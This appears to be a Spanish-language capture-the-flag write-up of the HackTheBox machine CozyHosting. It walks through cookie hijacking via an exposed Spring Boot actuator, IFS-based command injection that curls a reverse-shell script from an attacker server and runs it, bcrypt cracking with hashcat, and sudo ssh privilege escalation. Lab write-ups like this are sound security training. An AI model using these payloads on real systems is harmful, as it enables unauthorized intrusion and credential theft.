---
title: CozyHosting
date: 2024-08-31
categories: [WRITEUPS, HackTheBox]
tags: []  # TAG names should always be lowercase
image: /assets/images/hackthebox/htblogo.png
---

![picture](/assets/images/hackthebox/cozy1.png)

---

Buenas, en este ***Writeup*** explotaremos un **Coockies Hijacking**, entraremos al servidor gracias a un **RCE** dentro del Dashboard del administrador, y escalaremos privilegios gracias a los permisos de **SUDO** en el binario **/usr/bin/ssh**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos será un escaneo con *NMAP*, para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open -T5 10.10.11.230 -n -Pn -v
```

![picture](/assets/images/hackthebox/cozy2.png){: w="600" h="300" }

Una vez comprobados los puertos, nos iremos al navegador web para ver la página asociada a la *IP*, al no mostrar contenido porque no está resolviendo el nombre de dominio, tendremos que añadir el dominio junto con la *IP* al archivo "**/etc/hosts**".

![picture](/assets/images/hackthebox/cozy3.png)

Una vez guardado, nos vamos al navegador a ver el contenido.

![picture](/assets/images/hackthebox/cozy4.png)

Buscando con **Wappalyzer**, **Whatweb**, y el código de la página no consigo encontrar que aplicación está corriendo por detrás.

Realizando **Fuzzing** con **Gobuster**, no encuentro mucho contenido

```bash
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404 -x .txt,.php,.sh,.html,.png,.jpg
```

![picture](/assets/images/hackthebox/cozy5.png)

Si nos metemos en la ruta "**/error**", nos muestra el siguiente mensaje.

![picture](/assets/images/hackthebox/cozy6.png){: w="600" h="300" }

Buscando por internet el error, encuentro que se trata de **Spring Boot**, que es un marco **Java** de código abierto que se utiliza para programar aplicaciones independientes basadas en **Spring** de nivel de producción con un mínimo esfuerzo.

Podemos encontrar una lista de rutas de **Spring Boot** en "**/usr/share/SecLists/Discovery/Web-Content/spring-boot.txt**", así que la idea será realizar **Fuzzing** con esta lista.

```bash
gobuster dir -t 100 -u http://cozyhosting.htb/ -w /usr/share/SecLists/Discovery/Web-Content/spring-boot.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403,500
```

![picture](/assets/images/hackthebox/cozy7.png)

En la ruta "**/actuator/sessions**" encontramos lo que parece ser un usuario.

![picture](/assets/images/hackthebox/cozy8.png)

Al interceptar la petición con **Burpsuite**, si volvemos a mirar la ruta "**/actuator/sessions**", nos damos cuenta que el número que sale al lado del usuario, es la **coockie de sesión**, como podemos ver en las siguientes 2 imágenes.

![picture](/assets/images/hackthebox/cozy9.png)

![picture](/assets/images/hackthebox/cozy10.png)

---
## **Explotación**

Comprobando lo anterior nos damos cuenta que podemos explotar un **Coockies Hijacking**, con la **coockie** de sesión del usuario **kanderson**.

Para realizarlo, presionaremos "**F12**", nos iremos a **Storage**, y cambiaremos el valor de nuestra **Coockie**, y pondremos el ***HttpsOnly*** en ***false***, ya que sin esto no funcionará. 

![picture](/assets/images/hackthebox/cozy16.png)


Y una vez lo realicemos, escribiremos **admin** en la ruta del dominio, y nos meterá en el **Dashboard** del admin.

![picture](/assets/images/hackthebox/cozy17.png)

A continuación, interceptaremos la petición con **Burpsuite**, para ver como se envía.

![picture](/assets/images/hackthebox/cozy18.png)

La envíamos al **repiter**, y volvemos a lanzar la petición, y nos dice que no puede resolver el **Hostname** **test**.

![picture](/assets/images/hackthebox/cozy19.png)

Probando distintos nombres, e intentando inyectar comandos tanto en **Hostname**, como en **Username**, podemos ejecutar comandos en el parámetro **Username**.

![picture](/assets/images/hackthebox/cozy22.png)

Si intentamos listar un comando con espacios, nos dice que no puede contener espacios.

![picture](/assets/images/hackthebox/cozy23.png)

Lo que vamos a realizar, es sustituir los espacios por barras bajas __ .

Para ello utilizaremos la variable **IFS** de bash para que defina los separadores internos entre campos para palabras.

Crearemos un script al que llamaré **rshell.sh** en nuestra máquina local con el contenido de una **Reverse Shell**.

```bash
bash -i >& /dev/tcp/nuestra ip/4444 0>&1
```

Y crearemos un servidor **HTTP** donde hayamos creado el archivo.

```bash
python3 -m http.server 8888
```

Enviamos el siguiente comando con la variable **IFS** en el parámetro de **username**.

```bash
$(IFS=_;command='curl_http://10.10.16.4:8888/rshell.sh_--output_/tmp/rshell.sh';$command)
```


![picture](/assets/images/hackthebox/cozy24.png){: w="600" h="300" }

Le damos permisos al script.

```bash
$(IFS=_;command='chmod_777_/tmp/rshell.sh';$command)
```

![picture](/assets/images/hackthebox/cozy25.png){: w="600" h="300" }

Nos abrimos un Listener con ncat.

```bash
nc -nlvp 4444
```

Y ejecutamos el script.

```bash
$(IFS=_;command='/tmp/rshell.sh';$command)
```

![picture](/assets/images/hackthebox/cozy26.png){: w="600" h="300" }

Y obtenemos acceso al servidor, como el usuario **app**.

![picture](/assets/images/hackthebox/cozy27.png){: w="600" h="300" }

Realizamos un tratamiento de la **TTY**, para poder movernos mejor mediante la terminal.

(*Para ver el número de filas y columnas en vuestra máquina, dirigiros a vuestra máquina local y ejecutais **stty size***, *y cambiáis si es necesario el número de filas y columnas*)

```bash
script /dev/null -c bash
Ctrl_Z
stty raw -echo; fg
reset xterm
stty rows 49 columns 188
export TERM=xterm
```

---

## **Escalada de privilegios**

Dentro de la máquina, encontramos un archivo **.jar**, que nos vamos a traer a la máquina local para descomprimirlo y ver su contenido.

Montamos un servidor **HTTP** en el servidor, y nos lo descargamos en la máquina local con **wget**.

![picture](/assets/images/hackthebox/cozy28.png)

```bash
wget http://10.10.11.230:4444/cloudhosting-0.0.1.jar
```

![picture](/assets/images/hackthebox/cozy29.png)

Lo descomprimimos con **unzip**.

```bash
unzip cloudhosting-0.0.1.jar
```

Y encontramos 3 carpetas.

![picture](/assets/images/hackthebox/cozy30.png)

En el archivo "**/BOOT-INF/classes/application.properties**" encontramos, lo que parecen ser las credenciales de una base de datos **POSTGRESQL**.

![picture](/assets/images/hackthebox/cozy31.png){: w="600" h="300" }

Entramos dentro de la base de datos de "**cozyhosting**", y encontramos las credenciales de **kanderson**, y el **admin**.

![picture](/assets/images/hackthebox/cozy32.png){: w="600" h="300" }

Comprobamos que el hash es del tipo **bcrypt**.

![picture](/assets/images/hackthebox/cozy34.png){: w="600" h="300" }

Intentamos descifrarlo mediante ataque de diccionario.

```bash
hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

Y encuentra la contraseña del **Admin**.

![picture](/assets/images/hackthebox/cozy33.png){: w="600" h="300" }

Vemos que hay un usuario **josh**, intentamos migrar con la contraseña del **Admin**, y funciona.

![picture](/assets/images/hackthebox/cozy35.png)
Y en su carpeta personal encontramos la primera **flag**.

![picture](/assets/images/hackthebox/cozy36.png)

Listando los permisos de **SUDO**, comprobamos que puede ejecutar como **root** el binario **/usr/bin/ssh**.

En la web de [**GTFOBins - ssh**](https://gtfobins.github.io/gtfobins/ssh/), nos indica como podemos escalar privilegios.

En la carpeta personal de **root** encontramos la segunda **flag**.

![picture](/assets/images/hackthebox/cozy37.png)

![picture](/assets/images/hackthebox/cozy38.png){: w="600" h="300" }